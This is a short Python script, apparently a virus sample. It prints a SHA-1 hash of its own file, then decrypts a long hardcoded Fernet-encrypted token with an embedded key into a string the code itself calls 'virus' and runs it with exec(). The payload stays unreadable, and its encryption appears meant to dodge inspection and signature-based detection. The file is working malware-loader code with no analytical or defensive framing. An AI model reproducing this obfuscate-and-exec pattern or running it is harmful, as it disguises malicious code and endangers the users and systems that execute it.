import inspect
import os
from cryptography.fernet import Fernet
import hashlib


# ---------------------------------------------------------------------------
# Getting file Hash Unrelated to the virus code
def hash_file(filename):
   h = hashlib.sha1()
   with open(filename,'rb') as file:
       chunk = 0
       while chunk != b'':
           chunk = file.read(1024)
           h.update(chunk)

   return h.hexdigest()

message = hash_file(os.path.basename(__file__))
print("Hash of the file is: ", message)
# End of Hash Code
# ---------------------------------------------------------------------------


def decrypt(token, key):
    fer = Fernet(key)
    virus = fer.decrypt(token).decode()
    exec(virus)


# START
key = "q1wpQGvg7UrPBssPk8FqXpfdMQVWZ82sGLfjmSCVr-I="
token = "gAAAAABnMnHGcXsZbuoBVgdwf5VNvWe9zUs3vQx5P3VkiHvFsRETOTAK5_q4o7sKCIcakqPQ6TpBHTA1RbLiaiFZn-G11_lmX2C-5dfgleA8CVZw2Mh_grlcW8hQTN15hgjV7JXK14E5VnJq9InqTyeiD58ETm3Ez1yN-CL76nY8VShq_vmByQd_HeSIdCpyex1PXCjm8YWSS8aEScx4r8hHzgBJoPA9VvZJScd8MW3S6FFy9mzTQkpw3HPfNFnnN6BQ8-7pVYgCqH4q70VCDcYx5-I5RoLg1SZxTlUA0ssg3l6zcQlAJ-V2W_W22mywpnS5UF6Cm1DJA_eopa-_TFXUns5etXdwABdLomFo27pYCV-aLLSw2c5KM0oTlwV7C48F9zukJb6DEZMNg-K7u4vhXvea1k4wJa05lkYT2TRc5wM0ODq3dN5vrqAlPno20pxSDljkKHhiPyzlUuVgrOjyNM-XxhJzYwhUNIe1BEvPtmNqyb-6U5T51miAla2SyA91wGOBSXzl2ZAm_g4QQYjCzSwh55yCr2nNt6Kdu8Ip_r7xbV0KwxvYFZBYE2LeAummwXA0pRqyizM9vbZdjGOn6GhsFIR8YhaZ9kHrA4Blv_Gz1QFQHKWqZSBSZO9CN8dEsWhzr4Pivddl9UoupxsiMKuI76miMx97pGqO3EhxSYBeEVyN_MPXpZFmQZhlx41qwdQ73Is9zuyyuBz1grct2aAZ-b1VOGIdOinpM7pdLR8-Qq40FvYqfd0CISSY1TN_Z_rlpotXA9x-tKd1ztTtsTAnZNBkm_PbyF_9qUAEqp0mhRaQAvIqK9Xt4TTUyOmumz4sdYklfMY_EBa4smwko4xTHhQRoPxbssJQSkqe3PIpDOHYlT8xB4lhq6H8v546IN3WFw2-aYvFycebbvTE5MSrdYCe16Ubjg-3d-J8Lfbf3Tx64EcTN2H3tNP1OqiCDzdreD8CVeProS2HlGcgEmP8A25qIgK5cmn7-6E1xamMotEJdbap5qsSGP-f4n-YZ6K8CIi3UJzQOfVvzmyP9GV73Mgrls4wF2QH001H6dKueSxjah42vfl_HSoBnzhcnE5O5UDeQXQZc_Rp1QI_oC1rOkERY6xVmvRiS9W2vaAj6hmtvzEP8sULEYnDNAGXJvjsP4xwcCxSdduyaTe9MgWToAlTb21KNO1wSe8pGB9isPKSCVoSpz74WN_5RbF_BdAfMRSBM3bSBU3TQmNvLn0DeyS6ajiYkkFAwqsD_11O7goEdhsyZaBIIxg5_VCsuIQQEAi3obC9VVYSf-Jstruzu7kVuEknfIdRhE9tvIudpVqiGd1iuXGFkO1bV1uuKuFxox7LYz6iMoOAlhuGpXK041mBZ37w5u2036adZPMuyLbwg2fnrXFfpqo8FnUJOzhEejfB1xB7QPM60JcNJO6niBlT8V5lOqLrGh_jihfQ9CkNXosKGMdTmLmYHWpaBoEQi7Ty0mIl_Fn-NOveai-YJ9ILLtf1qIhM0xGPrun95T1ZMDuvrIp-OcVZ-CpHBedPpoBIfnPoPQsUWJ9-IJgx9ip6nSG5-jUD36eEXrRo8OA6xattrzaZ3-yiPKgHnN9G_RDM0WjluXueY3pOZf1VNBzTrZfnAWv8FRFQYWX2qerGDrOyseFNyxpBzslaeoB60XIbkzswTyRt1bltcJXapsEXqPjVjnX5s0W_A7WKK9clhYvFCW1Me9MXn3GCHE9GjMroTrvCkGN4UefgJ5lUI3xNDQSQQxDQfQarjUJ8Ef7hEEvmQwQE9yR0IakTZYiwRR_f9cShAKMJDQvbtyUEI2lh-2I-aiYMdl110MID8V7eBdxEkppJ5rD0Jxbmzhst7v3xeMiG78FQARjC3nLK-eQAW5A8kPem60idT1q2vjp9aETt8z2B6DExg6Vz6QpaDs0Er4P5XydqIT5e0pu15ix2nbrqm8kBhkktBYG_7qMGFRw="

decrypt(token, key)
